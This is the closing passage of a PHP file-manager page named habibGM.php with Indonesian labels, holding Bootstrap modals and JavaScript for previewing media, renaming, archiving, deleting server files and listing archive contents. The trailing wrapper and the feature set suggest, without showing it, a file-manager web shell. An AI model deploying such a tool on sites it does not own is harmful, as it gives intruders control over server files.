    <div class="modal fade" id="videoModal" tabindex="-1" aria-labelledby="videoModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg modal-dialog-centered">
            <div class="modal-content gelas">
                <div class="modal-header border-bottom-0">
                    <h5 class="modal-title" id="videoModalLabel">Pratinjau Video</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <video id="videoPlayer" class="w-100" controls>
                        Your browser does not support the video tag.
                    </video>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="audioModal" tabindex="-1" aria-labelledby="audioModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content gelas">
                <div class="modal-header border-bottom-0">
                    <h5 class="modal-title" id="audioModalLabel">Pratinjau Audio</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <audio id="audioPlayer" class="w-100" controls>
                        Your browser does not support the audio element.
                    </audio>
                </div>
            </div>
        </div>
    </div>
  <div class="modal fade" id="archiveModal" tabindex="-1" aria-labelledby="archiveModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content gelas">
            <form action="habibGM.php?path=<?php echo urlencode($dir); ?>" method="post" id="archiveForm">
                <div class="modal-header">
                    <h5 class="modal-title" id="archiveModalLabel">Arsipkan Item</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Apakah Anda yakin ingin mengarsipkan item yang dipilih?</p>
                    <ul id="archive-list" class="list-group mb-3"></ul>
                    <div id="archive-inputs-container"></div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
                    <button type="submit" class="btn btn-primary">Arsipkan</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content gelas">
            <form action="habibGM.php?path=<?php echo urlencode($dir); ?>" method="post" id="deleteForm">
                <div class="modal-header">
                    <h5 class="modal-title" id="deleteModalLabel">Hapus Item</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Anda yakin ingin menghapus item-item berikut? Tindakan ini tidak dapat dibatalkan.</p>
                    <ul id="delete-list" class="list-group mb-3"></ul>
                    <div id="delete-inputs-container"></div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
                    <button type="submit" class="btn btn-danger">Hapus</button>
                </div>
            </form>
        </div>
    </div>
</div>
  <div class="modal fade" id="archiveViewerModal" tabindex="-1" aria-labelledby="archiveViewerModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg modal-dialog-scrollable">
        <div class="modal-content gelas">
            <div class="modal-header">
                <h5 class="modal-title" id="archiveViewerModalLabel">Isi Arsip</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <ul id="archive-contents-list" class="list-group">
                    </ul>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
            </div>
        </div>
    </div>
</div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script>
    document.addEventListener('DOMContentLoaded', function () {
        // Renaming Modal Logic
        const renameModal = new bootstrap.Modal(document.getElementById('renameModal'));
        const renameForm = document.getElementById('renameForm');
        const renameOldNameInput = document.getElementById('renameOldName');
        const renameNewNameInput = document.getElementById('renameNewName');

        document.querySelectorAll('.rename-btn').forEach(button => {
            button.addEventListener('click', function () {
                const oldName = this.getAttribute('data-old-name');
                renameOldNameInput.value = oldName;
                renameNewNameInput.value = oldName;
                renameModal.show();
            });
        });

        // Auto-dismiss alert
        var myAlert = document.getElementById('myAlert');
        if (myAlert) {
            setTimeout(function() {
                var bsAlert = new bootstrap.Alert(myAlert);
                bsAlert.close();
            }, 3000);

            setTimeout(function() {
                const url = new URL(window.location.href);
                url.searchParams.delete('alert_message');
                url.searchParams.delete('alert_status');
                window.history.replaceState({}, document.title, url);
            }, 3500);
        }

        // Image Preview Modal Logic
        const imageModal = document.getElementById('imageModal');
        const imagePreview = document.getElementById('imagePreview');

        imageModal.addEventListener('show.bs.modal', function (event) {
            const link = event.relatedTarget;
            const imagePath = link.getAttribute('data-image-path');
            imagePreview.src = imagePath;
        });

        // Video Player Modal Logic
        const videoModal = document.getElementById('videoModal');
        const videoPlayer = document.getElementById('videoPlayer');

        videoModal.addEventListener('show.bs.modal', function (event) {
            const link = event.relatedTarget;
            const videoPath = link.getAttribute('data-video-path');
            videoPlayer.src = videoPath;
            videoPlayer.load(); // Memuat ulang video
            videoPlayer.play(); // Memulai pemutaran video
        });

        videoModal.addEventListener('hide.bs.modal', function () {
            videoPlayer.pause(); // Menghentikan video saat modal ditutup
            videoPlayer.currentTime = 0; // Mengatur ulang waktu video
        });
        
        // Audio Player Modal Logic
        const audioModal = document.getElementById('audioModal');
        const audioPlayer = document.getElementById('audioPlayer');

        audioModal.addEventListener('show.bs.modal', function (event) {
            const link = event.relatedTarget;
            const audioPath = link.getAttribute('data-audio-path');
            audioPlayer.src = audioPath;
            audioPlayer.load(); // Memuat ulang audio
            audioPlayer.play(); // Memulai pemutaran audio
        });
  // Logika untuk fitur Arsip
    const archiveBtn = document.getElementById('archive-btn');
    const deleteBtn = document.getElementById('delete-selected-btn');
    const itemCheckboxes = document.querySelectorAll('.item-checkbox');
    const selectAllCheckbox = document.getElementById('select-all-checkbox');
    const archiveModal = new bootstrap.Modal(document.getElementById('archiveModal'));
    const archiveList = document.getElementById('archive-list');
    const archiveInputsContainer = document.getElementById('archive-inputs-container');
    const deleteModal = new bootstrap.Modal(document.getElementById('deleteModal'));
    const deleteList = document.getElementById('delete-list');
    const deleteInputsContainer = document.getElementById('delete-inputs-container');
    const archiveViewerModal = new bootstrap.Modal(document.getElementById('archiveViewerModal'));
    const archiveContentsList = document.getElementById('archive-contents-list');


    function updateActionButtons() {
        const checkedItems = document.querySelectorAll('.item-checkbox:checked');
        archiveBtn.disabled = checkedItems.length === 0;
        deleteBtn.disabled = checkedItems.length === 0;
    }

    // Mengaktifkan atau menonaktifkan tombol aksi saat cekbox diubah
    itemCheckboxes.forEach(checkbox => {
        checkbox.addEventListener('change', updateActionButtons);
    });

    // Logika "Pilih Semua"
    selectAllCheckbox.addEventListener('change', function() {
        itemCheckboxes.forEach(checkbox => {
            checkbox.checked = this.checked;
        });
        updateActionButtons();
    });

    // Event listener untuk tombol Arsipkan
    archiveBtn.addEventListener('click', function () {
        const checkedItems = document.querySelectorAll('.item-checkbox:checked');
        archiveList.innerHTML = '';
        archiveInputsContainer.innerHTML = '';

        checkedItems.forEach(item => {
            const itemName = item.value;
            const listItem = document.createElement('li');
            listItem.className = 'list-group-item gelas';
            listItem.textContent = itemName;
            archiveList.appendChild(listItem);

            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'archive_items[]';
            input.value = itemName;
            archiveInputsContainer.appendChild(input);
        });

        archiveModal.show();
    });
        // Event listener untuk tombol Hapus
    deleteBtn.addEventListener('click', function () {
        const checkedItems = document.querySelectorAll('.item-checkbox:checked');
        deleteList.innerHTML = '';
        deleteInputsContainer.innerHTML = '';

        checkedItems.forEach(item => {
            const itemName = item.value;
            const listItem = document.createElement('li');
            listItem.className = 'list-group-item gelas';
            listItem.textContent = itemName;
            deleteList.appendChild(listItem);

            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'delete_items[]';
            input.value = itemName;
            deleteInputsContainer.appendChild(input);
        });

        deleteModal.show();
    });

        audioModal.addEventListener('hide.bs.modal', function () {
            audioPlayer.pause(); // Menghentikan audio saat modal ditutup
            audioPlayer.currentTime = 0; // Mengatur ulang waktu audio
        });
      
    // New: Archive Viewer Logic
    document.querySelectorAll('.view-archive-btn').forEach(button => {
        button.addEventListener('click', function () {
            const fileName = this.getAttribute('data-filename');
            const currentPath = "<?php echo urlencode($dir); ?>";
            
            // Show loading message
            archiveContentsList.innerHTML = `<li class="list-group-item text-center">Memuat isi arsip...</li>`;

            fetch(`habibGM.php?action=view_archive_contents&path=${currentPath}&file=${encodeURIComponent(fileName)}`)
                .then(response => response.json())
                .then(data => {
                    archiveContentsList.innerHTML = ''; // Clear loading message

                    if (data.success && data.contents.length > 0) {
                        data.contents.forEach(item => {
                            const listItem = document.createElement('li');
                            const icon = document.createElement('i');
                            listItem.className = 'list-group-item gelas';
                            
                            // Check if the item is a directory (ends with '/')
                            if (item.name.endsWith('/')) {
                                icon.className = 'fas fa-folder me-2';
                                listItem.textContent = item.name;
                            } else {
                                icon.className = 'far fa-file me-2';
                                listItem.textContent = `${item.name} (${(item.size / 1024).toFixed(2)} KB)`;
                            }

                            listItem.prepend(icon);
                            archiveContentsList.appendChild(listItem);
                        });
                    } else {
                        archiveContentsList.innerHTML = `<li class="list-group-item text-center">Gagal memuat isi arsip atau arsip kosong.</li>`;
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    archiveContentsList.innerHTML = `<li class="list-group-item text-center">Terjadi kesalahan saat mengambil data.</li>`;
                });

            archiveViewerModal.show();
        });
    });
    });
    </script>
    
</body>
</html>
<?php 
} 
?>')); ?>